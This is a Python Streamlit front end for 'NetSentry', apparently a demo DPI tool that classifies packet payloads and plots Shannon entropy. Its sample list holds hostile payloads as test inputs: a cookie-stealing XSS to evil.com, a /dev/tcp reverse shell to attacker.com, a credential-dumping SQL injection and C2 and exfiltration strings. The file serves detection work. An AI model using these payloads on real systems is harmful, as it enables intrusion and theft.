"""
NetSentry — DPI Payload Analyzer v3
Pure black, Vercel-grade typography, session stats, real animations.
"""
import os, random, string
import requests
import numpy as np
import streamlit as st
import plotly.graph_objects as go

API_URL  = os.getenv("NETSENTRY_API",  "http://localhost:3001")
DASH_URL = os.getenv("NETSENTRY_DASH", "http://localhost:5173")

st.set_page_config(
    page_title="NetSentry · DPI Analyzer",
    page_icon="⬡",
    layout="wide",
    initial_sidebar_state="expanded",
)

# ═══════════════════════════════════════════════════════════════════════════
#  CSS — single block, @import for fonts (no <link> tag — that was the bug)
# ═══════════════════════════════════════════════════════════════════════════
st.markdown("""
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Rajdhani:wght@500;600;700&display=swap');

* { font-family: 'Inter', sans-serif; }
html, body, [data-testid="stAppViewContainer"], .main, .block-container {
  background: #000000 !important;
  color: #f5f5f7;
}
[data-testid="stHeader"] { display: none !important; }
#MainMenu, footer { visibility: hidden !important; height: 0 !important; }

[data-testid="stSidebar"] {
  background: #050508 !important;
  border-right: 1px solid #1a1a24 !important;
}
[data-testid="stSidebar"] > div:first-child { padding-top: 0 !important; }
[data-testid="stSidebarNav"] { display: none; }

.block-container {
  padding-top: 1.8rem !important;
  padding-bottom: 4rem !important;
  max-width: 1400px !important;
}

/* Subtle cyan glow backdrop */
[data-testid="stAppViewContainer"]::before {
  content: '';
  position: fixed;
  top: 0; left: 0; right: 0; height: 400px;
  background: radial-gradient(ellipse at 30% 0%, rgba(0,212,255,0.06) 0%, transparent 60%);
  pointer-events: none;
  z-index: 0;
}

/* ─── Form inputs ─────────────────────────────────────────────────── */
.stSelectbox label, .stTextInput label, .stTextArea label {
  font-size: 10px !important;
  color: #48484d !important;
  text-transform: uppercase !important;
  letter-spacing: 0.14em !important;
  font-weight: 600 !important;
  margin-bottom: 6px !important;
}
[data-testid="stSidebar"] .stSelectbox div[data-baseweb="select"] > div,
[data-testid="stSidebar"] .stTextArea textarea,
[data-testid="stSidebar"] .stTextInput input {
  background: #0a0a12 !important;
  border: 1px solid #1a1a26 !important;
  color: #f5f5f7 !important;
  font-family: 'JetBrains Mono', monospace !important;
  font-size: 12px !important;
  border-radius: 8px !important;
  transition: border-color 0.15s, box-shadow 0.15s;
}
[data-testid="stSidebar"] .stTextArea textarea:focus,
[data-testid="stSidebar"] .stTextInput input:focus {
  border-color: #00d4ff !important;
  box-shadow: 0 0 0 1px #00d4ff, 0 0 16px rgba(0,212,255,0.2) !important;
  outline: none !important;
}

/* ─── Primary button ─────────────────────────────────────────────── */
.stButton > button {
  background: linear-gradient(135deg, #00d4ff 0%, #0099cc 100%) !important;
  color: #000 !important;
  font-family: 'Rajdhani', sans-serif !important;
  font-weight: 700 !important;
  font-size: 15px !important;
  letter-spacing: 0.1em !important;
  text-transform: uppercase !important;
  border: none !important;
  border-radius: 10px !important;
  padding: 12px 20px !important;
  box-shadow: 0 0 20px rgba(0,212,255,0.25), inset 0 1px 0 rgba(255,255,255,0.2) !important;
  transition: all 0.15s ease !important;
}
.stButton > button:hover {
  box-shadow: 0 0 30px rgba(0,212,255,0.5), inset 0 1px 0 rgba(255,255,255,0.25) !important;
  transform: translateY(-1px);
}
.stButton > button:active {
  transform: translateY(0);
}

/* ─── Sidebar logo ─────────────────────────────────────────────── */
.sb-logo {
  margin: -1rem -1rem 1.25rem;
  padding: 24px 22px 20px;
  border-bottom: 1px solid #1a1a24;
  background: linear-gradient(180deg, rgba(0,212,255,0.06), transparent);
}
.sb-name {
  font-family: 'Rajdhani', sans-serif;
  font-size: 26px;
  font-weight: 700;
  color: #00d4ff;
  letter-spacing: 0.14em;
  text-shadow: 0 0 20px rgba(0,212,255,0.3);
  display: flex;
  align-items: center;
  gap: 8px;
}
.sb-tag {
  font-size: 10px;
  color: #48484d;
  letter-spacing: 0.2em;
  text-transform: uppercase;
  margin-top: 5px;
  font-weight: 500;
  font-family: 'JetBrains Mono', monospace;
}

.sb-section {
  font-size: 10px;
  color: #48484d;
  text-transform: uppercase;
  letter-spacing: 0.14em;
  font-weight: 600;
  margin-bottom: 8px;
  margin-top: 4px;
}

.status-box {
  background: #0a0a12;
  border: 1px solid #1a1a26;
  border-radius: 10px;
  padding: 12px 14px;
  font-size: 11px;
  color: #86868b;
  font-family: 'JetBrains Mono', monospace;
  display: flex;
  align-items: center;
  gap: 10px;
}
.status-dot {
  width: 8px; height: 8px;
  border-radius: 50%;
  flex-shrink: 0;
}
.status-dot.online { background: #30d158; box-shadow: 0 0 8px #30d158; animation: pulse 2s ease-in-out infinite; }
.status-dot.offline { background: #ff3860; box-shadow: 0 0 8px #ff3860; }
@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
.status-title { color: #f5f5f7; font-weight: 600; display: block; font-size: 11px; }
.status-title.online { color: #30d158; }
.status-title.offline { color: #ff3860; }

/* ─── Hero ─────────────────────────────────────────────── */
.hero {
  display: flex;
  align-items: flex-end;
  justify-content: space-between;
  gap: 24px;
  padding-bottom: 28px;
  border-bottom: 1px solid #1a1a24;
  margin-bottom: 8px;
  position: relative;
}

.hero-title {
  font-family: 'Rajdhani', sans-serif;
  font-size: 48px;
  font-weight: 700;
  line-height: 1;
  letter-spacing: 0.01em;
  margin: 0;
  color: #fff;
}
.hero-title .hex {
  color: #00d4ff;
  margin-right: 6px;
  text-shadow: 0 0 24px rgba(0,212,255,0.6);
  animation: breathe 3s ease-in-out infinite;
}
.hero-title .sep { color: #48484d; font-weight: 500; margin: 0 8px; }
.hero-title .dpi { color: #00d4ff; }
@keyframes breathe { 0%,100%{opacity:1; text-shadow: 0 0 16px rgba(0,212,255,0.4)} 50%{opacity:0.75; text-shadow: 0 0 28px rgba(0,212,255,0.8)} }

.hero-sub {
  font-size: 13px;
  color: #86868b;
  margin-top: 12px;
  max-width: 620px;
  line-height: 1.7;
}

.hero-actions {
  display: flex;
  align-items: center;
  gap: 10px;
  flex-shrink: 0;
}

.pill {
  display: inline-flex;
  align-items: center;
  gap: 7px;
  padding: 7px 14px;
  border-radius: 24px;
  font-size: 11px;
  font-weight: 600;
  letter-spacing: 0.1em;
  text-transform: uppercase;
}
.pill-live {
  background: rgba(48,209,88,0.08);
  border: 1px solid rgba(48,209,88,0.3);
  color: #30d158;
}
.pill-live::before {
  content: '';
  width: 6px; height: 6px; border-radius: 50%;
  background: #30d158;
  box-shadow: 0 0 8px #30d158;
  animation: pulse 2s ease-in-out infinite;
}
.pill-off {
  background: rgba(255,56,96,0.08);
  border: 1px solid rgba(255,56,96,0.3);
  color: #ff3860;
}

.hero-link {
  color: #00d4ff !important;
  text-decoration: none !important;
  font-size: 12px !important;
  font-weight: 600 !important;
  letter-spacing: 0.08em;
  padding: 8px 16px;
  border: 1px solid rgba(0,212,255,0.3);
  border-radius: 24px;
  transition: all 0.15s;
  text-transform: uppercase;
  font-family: 'Rajdhani', sans-serif;
}
.hero-link:hover {
  background: rgba(0,212,255,0.08);
  box-shadow: 0 0 16px rgba(0,212,255,0.25);
  border-color: #00d4ff;
}

/* ─── Session stats strip ───────────────────────────────── */
.sess-strip {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 1px;
  background: #1a1a24;
  border: 1px solid #1a1a24;
  border-radius: 12px;
  overflow: hidden;
  margin-bottom: 32px;
}
.sess-cell {
  background: #050508;
  padding: 16px 20px;
}
.sess-label {
  font-size: 10px;
  color: #48484d;
  text-transform: uppercase;
  letter-spacing: 0.14em;
  font-weight: 600;
  margin-bottom: 6px;
}
.sess-val {
  font-family: 'Rajdhani', sans-serif;
  font-size: 22px;
  font-weight: 700;
  color: #f5f5f7;
  line-height: 1;
}
.sess-val.cyan { color: #00d4ff; }
.sess-val.red { color: #ff3860; }
.sess-val.amber { color: #ff9500; }
.sess-val.green { color: #30d158; }

/* ─── Section headings ─────────────────────────────────── */
.section-h {
  font-family: 'Rajdhani', sans-serif;
  font-size: 13px;
  color: #86868b;
  text-transform: uppercase;
  letter-spacing: 0.18em;
  font-weight: 600;
  margin: 36px 0 16px;
  display: flex;
  align-items: center;
  gap: 12px;
}
.section-h::before {
  content: '';
  width: 3px; height: 14px;
  background: #00d4ff;
  box-shadow: 0 0 8px #00d4ff;
}

/* ─── Metric cards ─────────────────────────────────────── */
.mcard {
  background: #0a0a12;
  border: 1px solid #1a1a26;
  border-radius: 14px;
  padding: 22px 24px;
  position: relative;
  overflow: hidden;
  animation: slide-up 0.45s cubic-bezier(.25,.8,.25,1) both;
  transition: border-color 0.2s;
}
@keyframes slide-up {
  from { opacity: 0; transform: translateY(12px); }
  to { opacity: 1; transform: translateY(0); }
}
.mcard:hover { border-color: #2a2a3a; }
.mcard::before {
  content: '';
  position: absolute;
  top: 0; left: 20px; right: 20px;
  height: 2px;
  background: var(--accent, #00d4ff);
  border-radius: 0 0 4px 4px;
  box-shadow: 0 0 12px var(--accent, #00d4ff);
}
.mcard.delay-1 { animation-delay: 0.08s; }
.mcard.delay-2 { animation-delay: 0.16s; }
.mcard.delay-3 { animation-delay: 0.24s; }

.mcard.critical { --accent: #ff3860; box-shadow: 0 0 40px rgba(255,56,96,0.12); border-color: rgba(255,56,96,0.2); }
.mcard.high     { --accent: #ff9500; box-shadow: 0 0 40px rgba(255,149,0,0.1);  border-color: rgba(255,149,0,0.2); }
.mcard.medium   { --accent: #ffcc00; border-color: rgba(255,204,0,0.18); }
.mcard.low      { --accent: #30d158; border-color: rgba(48,209,88,0.18); }
.mcard.cyan     { --accent: #00d4ff; border-color: rgba(0,212,255,0.18); }

.m-label {
  font-size: 10px;
  color: #48484d;
  text-transform: uppercase;
  letter-spacing: 0.16em;
  font-weight: 600;
  margin-bottom: 14px;
}
.m-value {
  font-family: 'Rajdhani', sans-serif;
  font-size: 32px;
  font-weight: 700;
  line-height: 1;
  letter-spacing: 0.01em;
  color: #f5f5f7;
}
.m-value.critical { color: #ff3860; text-shadow: 0 0 16px rgba(255,56,96,0.4); }
.m-value.high     { color: #ff9500; text-shadow: 0 0 16px rgba(255,149,0,0.4);  }
.m-value.medium   { color: #ffcc00; }
.m-value.low      { color: #30d158; }
.m-value.cyan     { color: #00d4ff; text-shadow: 0 0 16px rgba(0,212,255,0.4); }
.m-value.muted    { color: #86868b; }
.m-value .unit    { font-size: 14px; color: #48484d; margin-left: 4px; font-weight: 500; }

.m-sub {
  font-size: 11px;
  color: #48484d;
  margin-top: 10px;
  font-family: 'JetBrains Mono', monospace;
  letter-spacing: 0.02em;
}

/* ─── Panel (chart container) ─────────────────────────────── */
.panel {
  background: #0a0a12;
  border: 1px solid #1a1a26;
  border-radius: 14px;
  padding: 20px 22px;
  animation: slide-up 0.5s cubic-bezier(.25,.8,.25,1) 0.3s both;
}
.panel-title {
  font-family: 'Rajdhani', sans-serif;
  font-size: 15px;
  color: #f5f5f7;
  font-weight: 600;
  letter-spacing: 0.04em;
  margin-bottom: 4px;
}
.panel-sub {
  font-size: 11px;
  color: #48484d;
  margin-bottom: 14px;
  font-family: 'JetBrains Mono', monospace;
}

/* ─── Welcome / idle state ────────────────────────────────── */
.welcome {
  background: linear-gradient(135deg, rgba(0,212,255,0.06) 0%, rgba(0,212,255,0.01) 100%);
  border: 1px solid rgba(0,212,255,0.18);
  border-left: 3px solid #00d4ff;
  border-radius: 12px;
  padding: 28px 32px;
  margin-bottom: 8px;
  position: relative;
  overflow: hidden;
}
.welcome::after {
  content: '';
  position: absolute;
  top: -50%; right: -10%;
  width: 300px; height: 300px;
  background: radial-gradient(circle, rgba(0,212,255,0.12), transparent 70%);
  pointer-events: none;
}
.welcome-title {
  font-family: 'Rajdhani', sans-serif;
  font-size: 26px;
  color: #00d4ff;
  font-weight: 700;
  letter-spacing: 0.02em;
  margin-bottom: 8px;
  text-shadow: 0 0 16px rgba(0,212,255,0.3);
}
.welcome-text {
  color: #86868b;
  font-size: 13px;
  line-height: 1.7;
  max-width: 700px;
}

/* ─── Feature cards ───────────────────────────────────────── */
.fcard {
  background: #0a0a12;
  border: 1px solid #1a1a26;
  border-radius: 14px;
  padding: 24px 26px;
  height: 100%;
  transition: all 0.2s;
  position: relative;
}
.fcard:hover {
  border-color: var(--c, #2a2a3a);
  transform: translateY(-2px);
}
.fcard-tag {
  font-family: 'Rajdhani', sans-serif;
  font-size: 10px;
  color: var(--c, #00d4ff);
  font-weight: 700;
  letter-spacing: 0.18em;
  text-transform: uppercase;
  margin-bottom: 16px;
}
.fcard-title {
  font-family: 'Rajdhani', sans-serif;
  font-size: 22px;
  font-weight: 700;
  color: #f5f5f7;
  margin-bottom: 6px;
  letter-spacing: 0.01em;
}
.fcard-desc {
  font-size: 12px;
  color: #86868b;
  line-height: 1.65;
}

/* ─── Sample chips ───────────────────────────────────────── */
.schip {
  background: #0a0a12;
  border: 1px solid #1a1a26;
  border-radius: 10px;
  padding: 14px 16px;
  display: flex;
  align-items: center;
  gap: 12px;
  transition: border-color 0.15s;
}
.schip:hover { border-color: #2a2a3a; }
.schip-dot {
  width: 6px; height: 6px;
  border-radius: 50%;
  background: var(--c);
  box-shadow: 0 0 6px var(--c);
  flex-shrink: 0;
}
.schip-name {
  color: #f5f5f7;
  font-weight: 500;
  font-size: 13px;
  flex: 1;
}
.schip-tag {
  font-size: 9px;
  color: #48484d;
  font-family: 'JetBrains Mono', monospace;
  letter-spacing: 0.08em;
  text-transform: uppercase;
}

/* ─── Expander / code ─────────────────────────────────────── */
.streamlit-expanderHeader, [data-testid="stExpander"] summary {
  background: #0a0a12 !important;
  border: 1px solid #1a1a26 !important;
  border-radius: 10px !important;
  color: #f5f5f7 !important;
  font-family: 'Rajdhani', sans-serif !important;
  font-weight: 600 !important;
  letter-spacing: 0.04em;
}
code, .stCode pre {
  background: #050508 !important;
  border: 1px solid #1a1a26 !important;
  border-left: 2px solid #00d4ff !important;
  border-radius: 8px !important;
  color: #00d4ff !important;
  font-family: 'JetBrains Mono', monospace !important;
  font-size: 11px !important;
  padding: 8px 12px !important;
}

/* ─── Alerts ──────────────────────────────────────────────── */
[data-testid="stAlert"] {
  background: #0a0a12 !important;
  border: 1px solid #1a1a26 !important;
  border-radius: 10px !important;
}

/* ─── Plotly background ───────────────────────────────────── */
.js-plotly-plot .plotly .main-svg { background: transparent !important; }

/* ─── Scrollbar ──────────────────────────────────────────── */
*::-webkit-scrollbar { width: 6px; height: 6px; }
*::-webkit-scrollbar-thumb { background: #1a1a26; border-radius: 3px; }
*::-webkit-scrollbar-thumb:hover { background: #2a2a3a; }
*::-webkit-scrollbar-track { background: transparent; }
</style>
""", unsafe_allow_html=True)

# ═══════════════════════════════════════════════════════════════════════════
#  SESSION STATE
# ═══════════════════════════════════════════════════════════════════════════
if 'history' not in st.session_state:
    st.session_state.history = []

# ═══════════════════════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════════════════════
def shannon_entropy(data: bytes) -> float:
    if not data: return 0.0
    freq = np.bincount(np.frombuffer(data, dtype=np.uint8), minlength=256)
    p = freq[freq > 0] / len(data)
    return float(-np.sum(p * np.log2(p)))

def entropy_windows(payload_str: str, window: int = 16):
    b = payload_str.encode('utf-8', errors='replace')
    if len(b) < window: return [shannon_entropy(b)]
    return [shannon_entropy(b[i:i+window]) for i in range(0, len(b)-window+1, 4)]

def generate_high_entropy_sample():
    charset = (string.ascii_letters + string.digits + string.punctuation + ' \t')
    charset += ''.join(chr(i) for i in range(192, 255))
    return ''.join(random.choices(charset, k=200))

SAMPLES = {
    "— Select a sample —":    "",
    "SQL Injection":          "' UNION SELECT username, password, credit_card FROM users WHERE '1'='1'--",
    "XSS Attack":             "<script>document.location='https://evil.com/steal?c='+document.cookie</script>",
    "Command Injection":      "ping -c 4 8.8.8.8; /bin/sh -i >& /dev/tcp/attacker.com/4444 0>&1",
    "C2 Beacon":              "GET /gate.php?id=infected_host&os=win10&av=none HTTP/1.1\r\nHost: c2.malware.ru\r\nUser-Agent: Mozilla/5.0",
    "Data Exfiltration":      "base64:H4sIAAAAAAAAA6tWKkktLlGyUlIqS8wpTgUAumfRFxAAAAA=.gzip.tunnel.attacker.xyz",
    "Encrypted tunnel":       generate_high_entropy_sample(),
    "Benign HTTP request":    "GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html",
    "Port scan probe":        "nmap -sS -p 22,80,443 192.168.1.0/24 --open",
    "Crypto miner traffic":   "stratum+tcp://xmr.pool.minergate.com:45700 {\"method\":\"login\",\"params\":{}}",
}

SAMPLE_COLORS = {
    "SQL Injection":         "#ff3860",
    "XSS Attack":            "#ff9500",
    "Command Injection":     "#ff3860",
    "C2 Beacon":             "#ff9500",
    "Data Exfiltration":     "#ff3860",
    "Encrypted tunnel":      "#ff9500",
    "Benign HTTP request":   "#30d158",
    "Port scan probe":       "#ffcc00",
    "Crypto miner traffic":  "#ffcc00",
}

# ═══════════════════════════════════════════════════════════════════════════
#  SIDEBAR
# ═══════════════════════════════════════════════════════════════════════════
with st.sidebar:
    st.markdown("""
    <div class="sb-logo">
      <div class="sb-name">⬡ NETSENTRY</div>
      <div class="sb-tag">DPI ANALYZER · V3</div>
    </div>
    """, unsafe_allow_html=True)

    st.markdown('<div class="sb-section">Sample Attack</div>', unsafe_allow_html=True)
    choice = st.selectbox("sample", list(SAMPLES.keys()), label_visibility="collapsed")

    st.markdown('<div class="sb-section" style="margin-top:14px">Source IP</div>', unsafe_allow_html=True)
    src_ip = st.text_input("src", "185.220.101.34", label_visibility="collapsed")

    st.markdown('<div class="sb-section" style="margin-top:14px">Payload Bytes</div>', unsafe_allow_html=True)
    payload = st.text_area(
        "payload",
        value=SAMPLES[choice],
        height=180,
        label_visibility="collapsed",
        placeholder="Paste or type any payload…",
    )

    st.markdown('<div style="height:8px"></div>', unsafe_allow_html=True)
    submit = st.button("⚡  CLASSIFY THREAT", use_container_width=True)

    st.markdown('<div style="height:18px"></div>', unsafe_allow_html=True)
    st.markdown('<div class="sb-section">Engine Status</div>', unsafe_allow_html=True)
    try:
        h = requests.get(f"{API_URL}/api/health", timeout=3).json()
        up_m = h.get('uptime_s', 0) // 60
        st.markdown(f"""
        <div class="status-box">
          <div class="status-dot online"></div>
          <div>
            <div class="status-title online">API ONLINE</div>
            <div style="margin-top:2px">{h.get('clients', 0)} clients · {up_m}m uptime</div>
          </div>
        </div>
        """, unsafe_allow_html=True)
    except Exception:
        st.markdown("""
        <div class="status-box" style="border-color:rgba(255,56,96,0.3)">
          <div class="status-dot offline"></div>
          <div>
            <div class="status-title offline">API OFFLINE</div>
            <div style="margin-top:2px">Start: cd api && npm start</div>
          </div>
        </div>
        """, unsafe_allow_html=True)

# ═══════════════════════════════════════════════════════════════════════════
#  HERO
# ═══════════════════════════════════════════════════════════════════════════
try:
    requests.get(f"{API_URL}/api/health", timeout=2).json()
    hero_pill = '<span class="pill pill-live">● Live Engine</span>'
except Exception:
    hero_pill = '<span class="pill pill-off">● Offline</span>'

st.markdown(f"""
<div class="hero">
  <div>
    <div class="hero-title">
      <span class="hex">⬡</span>NetSentry<span class="sep">·</span><span class="dpi">DPI</span> Analyzer
    </div>
    <div class="hero-sub">
      Deep packet inspection using Aho-Corasick multi-pattern matching, Shannon entropy profiling,
      and MATLAB db4 wavelet decomposition — detects encrypted C2 beacons that bypass signature-based IDS.
    </div>
  </div>
  <div class="hero-actions">
    {hero_pill}
    <a href="{DASH_URL}" target="_blank" class="hero-link">Dashboard ↗</a>
  </div>
</div>
""", unsafe_allow_html=True)

# ═══════════════════════════════════════════════════════════════════════════
#  SESSION STATS STRIP
# ═══════════════════════════════════════════════════════════════════════════
H = st.session_state.history
n_total   = len(H)
n_blocked = sum(1 for r in H if r.get('action') == 'BLOCK')
n_critical = sum(1 for r in H if r.get('severity') == 'CRITICAL')
avg_entropy = np.mean([r.get('entropy_score', 0) for r in H]) if H else 0.0

st.markdown(f"""
<div class="sess-strip">
  <div class="sess-cell">
    <div class="sess-label">Session · Total</div>
    <div class="sess-val cyan">{n_total}</div>
  </div>
  <div class="sess-cell">
    <div class="sess-label">Session · Blocked</div>
    <div class="sess-val red">{n_blocked}</div>
  </div>
  <div class="sess-cell">
    <div class="sess-label">Session · Critical</div>
    <div class="sess-val amber">{n_critical}</div>
  </div>
  <div class="sess-cell">
    <div class="sess-label">Avg Entropy H(X)</div>
    <div class="sess-val">{avg_entropy:.2f} <span style="color:#48484d;font-size:13px">bits</span></div>
  </div>
</div>
""", unsafe_allow_html=True)

# ═══════════════════════════════════════════════════════════════════════════
#  CLASSIFICATION RESULT
# ═══════════════════════════════════════════════════════════════════════════
if submit and payload:
    with st.spinner(""):
        try:
            resp = requests.post(
                f"{API_URL}/api/classify",
                json={"payload": payload, "src_ip": src_ip, "dst_port": 80},
                timeout=5,
            ).json()
        except Exception as e:
            st.error(f"API error: {e}")
            resp = None

    if resp:
        sev     = resp.get("severity", "LOW")
        threat  = resp.get("threat_type", "BENIGN")
        action  = resp.get("action", "PASS")
        ent     = resp.get("entropy_score", 0.0)
        n_bytes = resp.get("byte_count", len(payload.encode('utf-8')))

        st.session_state.history.append(resp)

        threat_cls  = sev.lower() if threat != 'BENIGN' else 'low'
        sev_cls     = sev.lower()
        action_cls  = 'critical' if action == 'BLOCK' else ('high' if action == 'ALERT' else 'low')
        action_lbl  = '⛔ BLOCK' if action == 'BLOCK' else ('⚠ ALERT' if action == 'ALERT' else '✓ PASS')

        sev_desc = {
            'CRITICAL': 'immediate response required',
            'HIGH':     'elevated — block recommended',
            'MEDIUM':   'monitored · low priority',
            'LOW':      'nominal · no action',
        }.get(sev, '')

        # ─── Metric cards row ───────────────────────────────────────────
        st.markdown('<div class="section-h">Classification Result</div>', unsafe_allow_html=True)
        c1, c2, c3, c4 = st.columns(4)
        with c1:
            st.markdown(f"""
            <div class="mcard {threat_cls}">
              <div class="m-label">Threat Type</div>
              <div class="m-value {threat_cls}">{threat.replace('_', ' ')}</div>
              <div class="m-sub">matched {len(resp.get('matched_rules', []))} rule(s)</div>
            </div>
            """, unsafe_allow_html=True)
        with c2:
            st.markdown(f"""
            <div class="mcard {sev_cls} delay-1">
              <div class="m-label">Severity</div>
              <div class="m-value {sev_cls}">{sev}</div>
              <div class="m-sub">{sev_desc}</div>
            </div>
            """, unsafe_allow_html=True)
        with c3:
            st.markdown(f"""
            <div class="mcard cyan delay-2">
              <div class="m-label">Entropy H(X)</div>
              <div class="m-value cyan">{ent:.2f}<span class="unit">bits</span></div>
              <div class="m-sub">{n_bytes} bytes · threshold 6.00</div>
            </div>
            """, unsafe_allow_html=True)
        with c4:
            st.markdown(f"""
            <div class="mcard {action_cls} delay-3">
              <div class="m-label">Action Taken</div>
              <div class="m-value {action_cls}">{action_lbl}</div>
              <div class="m-sub">broadcast → dashboard</div>
            </div>
            """, unsafe_allow_html=True)

        # ─── Entropy gauge + byte freq ───────────────────────────────────
        st.markdown('<div class="section-h">Entropy Analysis</div>', unsafe_allow_html=True)
        cg, cb = st.columns([1, 1.4])

        with cg:
            st.markdown("""
            <div class="panel">
              <div class="panel-title">Shannon Entropy Meter</div>
              <div class="panel-sub">0–4 text · 4–6 mixed · 6+ encrypted/C2</div>
            """, unsafe_allow_html=True)
            gauge = go.Figure(go.Indicator(
                mode="gauge+number",
                value=ent,
                number={'suffix': "  bits", 'font': {'size': 38, 'color': '#00d4ff', 'family': 'Rajdhani'}},
                gauge={
                    'axis': {'range': [0, 8], 'tickcolor': '#48484d', 'tickfont': {'color':'#48484d','size':11}, 'tickwidth': 1},
                    'bar': {'color': '#00d4ff', 'thickness': 0.28},
                    'bgcolor': '#050508',
                    'borderwidth': 1, 'bordercolor': '#1a1a26',
                    'steps': [
                        {'range': [0, 3], 'color': 'rgba(48,209,88,0.2)'},
                        {'range': [3, 5], 'color': 'rgba(0,212,255,0.12)'},
                        {'range': [5, 6], 'color': 'rgba(255,204,0,0.18)'},
                        {'range': [6, 7], 'color': 'rgba(255,149,0,0.25)'},
                        {'range': [7, 8], 'color': 'rgba(255,56,96,0.3)'},
                    ],
                    'threshold': {
                        'line': {'color': '#ff3860', 'width': 3},
                        'thickness': 0.85,
                        'value': 6.0,
                    },
                },
            ))
            gauge.update_layout(
                paper_bgcolor='rgba(0,0,0,0)', plot_bgcolor='rgba(0,0,0,0)',
                font_color='#86868b', height=210, margin=dict(l=30, r=30, t=20, b=10),
            )
            st.plotly_chart(gauge, use_container_width=True, config={'displayModeBar': False})
            st.markdown('</div>', unsafe_allow_html=True)

        with cb:
            st.markdown("""
            <div class="panel">
              <div class="panel-title">Byte Frequency Distribution</div>
              <div class="panel-sub">uniform = high entropy · cyan=letters · green=digits · orange=non-ASCII</div>
            """, unsafe_allow_html=True)
            b = payload.encode('utf-8', errors='replace')
            freq = np.bincount(np.frombuffer(b, dtype=np.uint8), minlength=256)
            colors = []
            for i in range(256):
                if i < 32:     colors.append('#2a2a3a')
                elif i < 48:   colors.append('#48484d')
                elif i < 58:   colors.append('#30d158')
                elif i < 65:   colors.append('#48484d')
                elif i < 91:   colors.append('#00d4ff')
                elif i < 97:   colors.append('#48484d')
                elif i < 123:  colors.append('#00d4ff')
                elif i < 127:  colors.append('#48484d')
                else:          colors.append('#ff9500')

            fig = go.Figure(go.Bar(
                x=list(range(256)), y=freq.tolist(),
                marker_color=colors, marker_line_width=0,
                hovertemplate='byte %{x}<br>count %{y}<extra></extra>',
            ))
            fig.update_layout(
                paper_bgcolor='rgba(0,0,0,0)', plot_bgcolor='rgba(0,0,0,0)',
                font_color='#86868b', height=210, margin=dict(l=0, r=0, t=4, b=30),
                xaxis=dict(title='byte value · 0–255', color='#48484d', gridcolor='#141421', zerolinecolor='#141421', tickfont=dict(size=10)),
                yaxis=dict(title='count', color='#48484d', gridcolor='#141421', zerolinecolor='#141421', tickfont=dict(size=10)),
                showlegend=False, bargap=0,
            )
            st.plotly_chart(fig, use_container_width=True, config={'displayModeBar': False})
            st.markdown('</div>', unsafe_allow_html=True)

        # ─── Entropy window chart (full width) ──────────────────────────
        st.markdown('<div class="section-h">Temporal Entropy · Wavelet Input</div>', unsafe_allow_html=True)
        windows = entropy_windows(payload)
        st.markdown("""
        <div class="panel">
          <div class="panel-title">Sliding-Window Shannon H(X)</div>
          <div class="panel-sub">time-series fed to MATLAB wavedec(H, 4, "db4") — periodic spikes = C2 beacon</div>
        """, unsafe_allow_html=True)
        wfig = go.Figure()
        wfig.add_trace(go.Scatter(
            y=windows, mode='lines+markers',
            line=dict(color='#00d4ff', width=2.5),
            marker=dict(size=5, color='#00d4ff', line=dict(color='#050508', width=1.5)),
            fill='tozeroy', fillcolor='rgba(0,212,255,0.08)',
        ))
        wfig.add_hline(y=6.0, line=dict(color='#ff3860', width=1.5, dash='dot'),
                       annotation_text=' C2 threshold · 6.0',
                       annotation_font_color='#ff3860',
                       annotation_position='right')
        wfig.update_layout(
            paper_bgcolor='rgba(0,0,0,0)', plot_bgcolor='rgba(0,0,0,0)',
            font_color='#86868b', height=240, margin=dict(l=0, r=80, t=8, b=30),
            xaxis=dict(title='payload window #', color='#48484d', gridcolor='#141421', zerolinecolor='#141421'),
            yaxis=dict(title='H(X) bits', range=[0, 8.2], color='#48484d', gridcolor='#141421', zerolinecolor='#141421'),
            showlegend=False,
        )
        st.plotly_chart(wfig, use_container_width=True, config={'displayModeBar': False})
        st.markdown('</div>', unsafe_allow_html=True)

        # ─── Matched rules ─────────────────────────────────────────────
        rules = resp.get("matched_rules", [])
        if rules:
            st.markdown('<div class="section-h">Matched Rules</div>', unsafe_allow_html=True)
            for r in rules:
                st.code(f"▸  {r}", language="text")

        # ─── Research expander ─────────────────────────────────────────
        with st.expander("🔬  How does entropy-based C2 beacon detection work?"):
            st.markdown("""
**Shannon Entropy** measures byte-level randomness:

```
H(X) = −Σ p(x) · log₂(p(x))
```

| Payload type          | Entropy         |
|-----------------------|-----------------|
| Natural English text  | 4.0–4.7 bits    |
| HTTP / HTML           | 4.5–5.2 bits    |
| Base64 encoded        | 5.8–6.2 bits    |
| Compressed (gzip)     | 7.4–7.9 bits    |
| Encrypted (TLS / AES) | 7.8–8.0 bits    |

**C2 beacon detection pipeline**

1. Compute Shannon entropy over 128-byte sliding windows per flow
2. Collect per-flow entropy time-series — one sample per window
3. Pass into MATLAB `wavedec(H, 4, "db4")` — 4-level db4 wavelet
4. Examine level-1 / level-2 detail coefficients for periodic spikes
5. Periodic high-entropy bursts every N seconds = C2 beacon fingerprint

Detects Cobalt Strike, Sliver, and custom implants that evade Snort and Suricata (signature-based).
The db4 wavelet reveals **non-stationary** periodicities that FFT misses.
            """)

elif submit and not payload:
    st.warning("Please enter a payload in the sidebar.")

else:
    # ═══════════════════════════════════════════════════════════════════════
    #  IDLE STATE
    # ═══════════════════════════════════════════════════════════════════════
    st.markdown("""
    <div class="welcome">
      <div class="welcome-title">▸ Ready to inspect</div>
      <div class="welcome-text">
        Select an attack pattern from the sidebar or paste a custom payload to run the DPI engine.
        Each classification is streamed to the live dashboard in real time — open it in another tab
        to see alerts appear on the global threat map.
      </div>
    </div>
    """, unsafe_allow_html=True)

    st.markdown('<div class="section-h">Detection Stack</div>', unsafe_allow_html=True)

    s1, s2, s3, s4 = st.columns(4)
    stack_items = [
        ('Pattern Match',   'Aho-Corasick',  'O(n+m) multi-pattern automaton',     '#00d4ff'),
        ('Protocol Parse',  'Trie',          'Deterministic · O(k) lookup',        '#30d158'),
        ('IP Reputation',   'Bloom Filter',  '4MB · 7 hashes · FP < 0.1%',         '#ffcc00'),
        ('C2 Research',     'db4 Wavelet',   'MATLAB · 4-level decomposition',     '#ff9500'),
    ]
    for col, (tag, title, desc, col_c) in zip([s1, s2, s3, s4], stack_items):
        with col:
            st.markdown(f"""
